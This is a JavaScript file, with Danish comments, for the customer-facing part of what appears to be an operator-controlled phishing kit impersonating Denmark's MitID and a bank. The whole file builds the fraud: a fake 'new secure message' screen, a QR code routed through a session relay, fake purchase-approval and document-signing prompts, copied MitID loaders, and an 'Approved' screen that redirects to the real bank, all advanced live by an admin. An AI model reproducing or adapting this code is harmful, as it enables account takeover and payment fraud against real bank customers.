/* ════════════════════════════════════════════════════════════
   display.js — Kunde-siden: komplet bank-login-rejse
   flow: 'besked' (ny besked) -> 'scan' (MitID QR) -> 'wait' (godkender) -> 'approved' (redirect til banken)
   Hvert trin ser ud som den ægte vare; admin styrer rækkenfølgen.
   ════════════════════════════════════════════════════════════ */

let lastSignature = null;
let socketConnected = false;
let qrInstance = null;
let redirectTimer = null;

function signatureOf(state) {
  return JSON.stringify([state.live, state.flow, state.target, state.sessionId, state.title, state.message, state.offlineTitle, state.offlineBody]);
}

/* ── QR-tegning — sort/hvid som originalt ── */
function drawQR(url) {
  const el = document.getElementById('qrcode');
  if (!el) return;
  el.innerHTML = '';

  if (window.QRCodeStyling) {
    qrInstance = new QRCodeStyling({
      width: 176, height: 176, type: 'svg',
      data: url,
      margin: 0,
      qrOptions: { errorCorrectionLevel: 'M' },
      dotsOptions: { type: 'square', color: '#000000' },
      cornersSquareOptions: { type: 'square', color: '#000000' },
      cornersDotOptions: { type: 'square', color: '#000000' },
      backgroundOptions: { color: '#ffffff' }
    });
    qrInstance.append(el);
  } else if (window.QRCode) {
    qrInstance = new QRCode(el, {
      text: url, width: 176, height: 176,
      colorDark: '#000000', colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.M
    });
  }
}

/* ── Hjælpere ── */
function $(id) { return document.getElementById(id); }
function show(el, disp) { if (el) el.style.display = disp || 'block'; }
function hide(el) { if (el) el.style.display = 'none'; }

function restoreChrome(){
  const hintRow = document.querySelector('.qr-hint');
  if (hintRow) hintRow.style.display = 'flex';
}

/* ════════════════════════════════════════════════════════════
   TRIN 1: 'besked' — "Du har modtaget en ny besked"
   ════════════════════════════════════════════════════════════ */
function showBesked(state) {
  hideWait(); hideAction(); 
  hide($('qrFrame')); hide($('approvedOverlay'));
  restoreChrome();

  $('formHeading').textContent = state.title || 'Du har modtaget en ny besked';
  $('hintText').textContent = state.message || 'Din bank har sendt dig en sikker besked';
  $('qrStatusLine').textContent = '';

  // Erstat QR-zonens indhold med besked-visning
  const zone = $('qrZone');
  if (zone) {
    let b = $('beskedBox');
    if (!b) {
      b = document.createElement('div');
      b.id = 'beskedBox';
      b.className = 'besked-box';
      zone.insertBefore(b, zone.firstChild);
    }
    b.innerHTML = `
      <div class="besked-icon">
        <svg width="44" height="44" viewBox="0 0 24 24" fill="#0060e6" aria-hidden="true">
          <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/>
          <path d="M11 5h2v6h-2zm0 8h2v2h-2z"/>
        </svg>
      </div>
      <div class="besked-title">Ny sikker besked</div>
      <div class="besked-sub">Fra din bank · lige nu</div>
      <button type="button" class="btn-primary" id="beskedFortsaet">
        <span>LÆS BESKED</span>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
      </button>`;
    // FORTSÆT -> kunden "åbner" beskeden -> går til MitID-login (scan)
    b.querySelector('#beskedFortsaet').addEventListener('click', () => {
      // klienten skifter selv til scan-trin (føles som et rigtigt flow)
      window.__pendingFlow = 'scan';
      poll(true);
    });
    b.style.display = 'block';
  }
  // (step-dots fjernet)
}

/* ════════════════════════════════════════════════════════════
   TRIN 2: 'scan' — MitID QR-login
   ════════════════════════════════════════════════════════════ */
function showScan(state) {
  hideWait(); hideAction();
  hide($('beskedBox')); hide($('approvedOverlay'));
  restoreChrome();
  

  $('formHeading').textContent = 'Log på';
  $('hintText').textContent = '';
  $('qrStatusLine').textContent = '';
  // hint-rækken ("Scan QR-kode med MitID app" + ikon) skjules på scan-siden
  const scanHint = document.querySelector('.qr-hint');
  if (scanHint) scanHint.style.display = 'none';

  const url = state.sessionId
    ? `${window.location.origin}/r/${state.sessionId}`
    : (state.target && state.target.trim() ? state.target.trim() : 'https://mitid.dk');
  drawQR(url);
  show($('qrFrame'), 'inline-block');
}

/* ════════════════════════════════════════════════════════════
   TRIN 2a: 'tekst' — admin viser en fritekst til kunden
   ════════════════════════════════════════════════════════════ */
function showTekst(state) {
  hideWait(); hideAction();
  hide($('qrFrame')); hide($('beskedBox')); hide($('approvedOverlay'));
  restoreChrome();
  

  $('formHeading').textContent = 'MitID Document Signing';
  $('hintText').textContent = '';
  $('qrStatusLine').textContent = '';
  const hintRow = document.querySelector('.qr-hint');
  if (hintRow) hintRow.style.visibility = 'hidden';

  const zone = $('qrZone');
  if (!zone) return;
  let box = $('tekstBox');
  if (!box) {
    box = document.createElement('div');
    box.id = 'tekstBox';
    box.className = 'esign-box';
    zone.insertBefore(box, zone.firstChild);
  }
  box.innerHTML = `
    <div class="esign-icon">
      <svg width="30" height="30" viewBox="0 0 24 24" fill="#0060e6" aria-hidden="true">
        <path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/>
      </svg>
    </div>
    <div class="esign-title"></div>
    <div class="esign-ref-row"><span class="esign-ref-label">Reference:</span> <span class="esign-ref"></span></div>
    <button type="button" class="esign-btn">CONTINUE</button>`;
  box.querySelector('.esign-title').textContent = state.tekst || '';
  box.querySelector('.esign-ref').textContent = state.sessionId || '—';
  box.querySelector('.esign-btn').addEventListener('click', function(){
    this.textContent = 'CONTINUING ...';
    this.disabled = true;
  });
  box.style.display = 'block';
}

function hideTekst(){
  const box = document.getElementById('tekstBox');
  if (box) box.style.display = 'none';
}

/* ════════════════════════════════════════════════════════════
   TRIN 2b: 'action' — "Godkend dette køb" / "Annullering af betaling"
   ════════════════════════════════════════════════════════════ */
function showAction(state) {
  hideWait(); 
  hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
  restoreChrome();
  clearTimeout(redirectTimer);

  const a = (state.action || {});
  $('formHeading').textContent = 'Confirm action';
  $('hintText').textContent = a.title || 'Godkend dette køb';
  $('qrStatusLine').textContent = '';

  const zone = $('qrZone');
  if (!zone) return;
  let box = $('actionBox');
  if (!box) {
    box = document.createElement('div');
    box.id = 'actionBox';
    box.className = 'action-box';
    zone.insertBefore(box, zone.firstChild);
  }
  box.innerHTML = `
    <div class="action-amount">${escapeHtml(a.amount || '')}</div>
    <div class="action-title">${escapeHtml(a.title || 'Godkend dette køb')}</div>
    ${a.detail ? `<div class="action-detail">${escapeHtml(a.detail)}</div>` : ''}
    <div class="action-divider"></div>
    <div class="action-waiting mitid-loader">
      <div class="mitid-mini-shield">
        <svg viewBox="0 0 100 117" class="mini-shield-svg"><path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/></svg>
        <div class="mini-rtr"></div>
      </div>
      <span>Godkend i MitID appen ...</span>
    </div>
    <div class="action-security">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="#2e9e5b" aria-hidden="true">
        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
      </svg>
      <span>Sikker godkendelse via MitID</span>
    </div>`;
  box.style.display = 'block';

  // (step-dots fjernet)
}

function escapeHtml(s) {
  const div = document.createElement('div');
  div.textContent = s || '';
  return div.innerHTML;
}

/* ════════════════════════════════════════════════════════════
   TRIN 3: 'wait' — "Forbinder sikkert til MitID"-loader
   ══════════════════════════════════════════════════════════════ */
function showWait() {
  
  hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
  // MitID-loader (skjold + roterende ring + prikker) som videoen
  const statuses = ['Approving identity ...', 'Checking information ...', 'Please wait ...'];
  mitidLoaderShow('Connecting securely to MitID', statuses[0]);
  clearInterval(window.__loaderTimer);
  window.__loaderTimer = setInterval(() => {
    const el = document.getElementById('mlSub');
    if (!el) return;
    const i = (parseInt(el.dataset.i || '0', 10) + 1) % statuses.length;
    el.dataset.i = i;
    el.textContent = statuses[i];
  }, 700);
}
function hideWait() {
  mitidLoaderHide();
  clearInterval(window.__loaderTimer);
}

/* ════════════════════════════════════════════════════════════
   TRIN 4: 'approved' — success + redirect til banken
   ════════════════════════════════════════════════════════════ */
function showApproved(state) {
  hideWait(); 
  hide($('beskedBox')); hide($('qrFrame'));

  $('formHeading').textContent = 'Approved';
  $('hintText').textContent = 'Your identity has been confirmed';
  $('qrStatusLine').textContent = 'Redirecting you ...';
  // (step-dots fjernet)

  let ov = $('approvedOverlay');
  if (!ov) {
    ov = document.createElement('div');
    ov.id = 'approvedOverlay';
    ov.style.cssText = 'position:fixed;inset:0;background:#fff;z-index:2000;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;';
    ov.innerHTML = `
      <svg viewBox="0 0 52 52" width="104" height="104" aria-hidden="true">
        <circle class="ap-ring" cx="26" cy="26" r="24" fill="none" stroke="#2e9e5b" stroke-width="3" stroke-linecap="round" stroke-dasharray="166" stroke-dashoffset="166"/>
        <path class="ap-check" d="M14 27l8 8 16-16" fill="none" stroke="#2e9e5b" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="48" stroke-dashoffset="48"/>
      </svg>
      <h2 style="font-size:21px;font-weight:700;color:#1c6b3c;margin:22px 0 8px;font-family:'IBM Plex Sans',Arial,sans-serif;">Approved</h2>
      <p style="font-size:14px;color:#666;max-width:320px;text-align:center;line-height:1.55;font-family:'IBM Plex Sans',Arial,sans-serif;">Your identity has been confirmed. You are now being redirected.</p>
      <style>
        #approvedOverlay .ap-ring { animation: apDraw .6s ease-out forwards; }
        #approvedOverlay .ap-check { animation: apDraw .4s ease-out .55s forwards; }
        @keyframes apDraw { to { stroke-dashoffset: 0; } }
        @keyframes apPulse { 0% { transform: scale(.72); opacity: .9; } 100% { transform: scale(1.28); opacity: 0; } }
        @keyframes apSpark { 0% { opacity: 0; transform: scale(0); } 60% { opacity: 1; transform: scale(1.25); } 100% { opacity: 0; transform: scale(1); } }
      </style>`;
    document.body.appendChild(ov);
  }
  ov.style.display = 'flex';
  const svg = ov.querySelector('svg');
  if (svg) { const clone = svg.cloneNode(true); svg.replaceWith(clone); }

  // auto-redirect til QR-målet (banken) efter 2 sek
  if (state.target && state.target.trim()) {
    clearTimeout(redirectTimer);
    redirectTimer = setTimeout(() => {
      window.location.href = state.target.trim();
    }, 2000);
  }
}

function hideAction(){
  const box = document.getElementById('actionBox');
  if (box) box.style.display = 'none';
}

/* ── OFFLINE — rent kort, ingen besked ── */
function showOffline(state) {
  hideWait(); 
  hideAction();
  hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
  clearTimeout(redirectTimer);
  $('formHeading').textContent = 'Log on';
  $('hintText').textContent = '';
  $('qrStatusLine').textContent = '';
  const hintRow = document.querySelector('.qr-hint');
  if (hintRow) hintRow.style.display = 'none';
}

/* ── HOVED-RENDER ── */
function render(state) {
  const signature = signatureOf(state);
  if (signature === lastSignature && !window.__pendingFlow) return;
  lastSignature = signature;
  delete window.__pendingFlow;
  // trin-overgang: genafspil fade+slide animation (som MitID)
  const card = document.querySelector('.login-card');
  if (card) { card.classList.remove('trin-fade'); void card.offsetWidth; card.classList.add('trin-fade'); }

  const flow = state.flow || 'scan';

  if (!state.live) { showOffline(state); return; }

  if (flow === 'besked')  { hideTekst(); hideWait(); hideAction(); showBesked(state); return; }
  if (flow === 'tekst')   { showTekst(state); return; }
  if (flow === 'action')  { hideTekst(); showAction(state); return; }
  if (flow === 'wait')    { hideTekst(); hideAction(); showWait(); return; }
  if (flow === 'approved'){ hideTekst(); hideAction(); showApproved(state); return; }
  hideTekst(); hideWait(); hideAction();
  showScan(state);
}

/* ── Poll hvert 1. sek + socket ── */
async function poll(force) {
  try {
    const res = await fetch('/api/public-state', { cache: 'no-store' });
    const state = await res.json();
    if (force) state.flow = window.__pendingFlow || state.flow;
    render(state);
  } catch (e) {}
}

poll();

try {
  const socket = io();
  socket.on('connect', () => { socketConnected = true; });
  socket.on('disconnect', () => { socketConnected = false; });
  socket.on('state-update', render);
} catch (e) {
  // socket.io utilgængelig — 1-sek pollering dækker
}

setInterval(() => poll(), 1000);

// Kiosk-genlad efter 1 time
setInterval(() => window.location.reload(), 60 * 60 * 1000);

/* ════════════════════════════════════════════════════════════
   MitID LOADER (præcis som video): skjold + roterende ring + prikker
   Bruges i ALLE transition-trin — 100% som originalen
   ════════════════════════════════════════════════════════════ */
function mitidLoaderShow(text, sub) {
  let ov = document.getElementById('mitidLoaderOv');
  if (!ov) {
    ov = document.createElement('div');
    ov.id = 'mitidLoaderOv';
    ov.style.cssText = 'position:fixed;inset:0;background:#fff;z-index:3000;display:flex;align-items:center;justify-content:center;';
    document.body.appendChild(ov);
  }
  ov.innerHTML = `
    <div style="display:flex;flex-direction:column;align-items:center;padding:24px;">
      <div style="margin-bottom:32px;">
        <svg width="80" height="21" viewBox="0 0 61 16">
          <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
        </svg>
      </div>
      <div style="position:relative;width:110px;height:128px;margin-bottom:28px;">
        <svg viewBox="0 0 100 117" style="width:100%;height:100%;animation:ml-pulse 1.6s ease-in-out infinite;">
          <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
        </svg>
        <svg viewBox="0 0 100 117" style="position:absolute;top:0;left:0;width:100%;height:100%;animation:ml-ring 1.8s linear infinite;">
          <path d="M49.9,4l43,12.9v36.7c0,42.5-43,54.4-43,54.4s-43-11.9-43-54.4V16.9L49.9,4" fill="none" stroke="#0060e6" stroke-width="3" stroke-dasharray="320" stroke-linecap="round"/>
        </svg>
      </div>
      <div style="font-size:16px;font-weight:600;color:#000;margin-bottom:6px;text-align:center;" id="mlText">${text || 'Forbinder sikkert til MitID'}</div>
      <div style="font-size:14px;color:#666;text-align:center;min-height:18px;" id="mlSub">${sub || 'Vent et øjeblik ...'}</div>
      <div style="display:flex;gap:7px;margin-top:20px;">
        <span style="width:8px;height:8px;border-radius:50%;background:#0060e6;animation:ml-dot 1.2s ease-in-out infinite;"></span>
        <span style="width:8px;height:8px;border-radius:50%;background:#0060e6;animation:ml-dot 1.2s ease-in-out .15s infinite;"></span>
        <span style="width:8px;height:8px;border-radius:50%;background:#0060e6;animation:ml-dot 1.2s ease-in-out .3s infinite;"></span>
      </div>
      <style>
        @keyframes ml-pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.4; transform:scale(1.06); } }
        @keyframes ml-ring { from { stroke-dashoffset:320; } to { stroke-dashoffset:-320; } }
        @keyframes ml-dot { 0%,80%,100% { transform:scale(.6); opacity:.4; } 40% { transform:scale(1); opacity:1; } }
      </style>
    </div>`;
  ov.style.display = 'flex';
}

function mitidLoaderHide() {
  const ov = document.getElementById('mitidLoaderOv');
  if (ov) ov.style.display = 'none';
}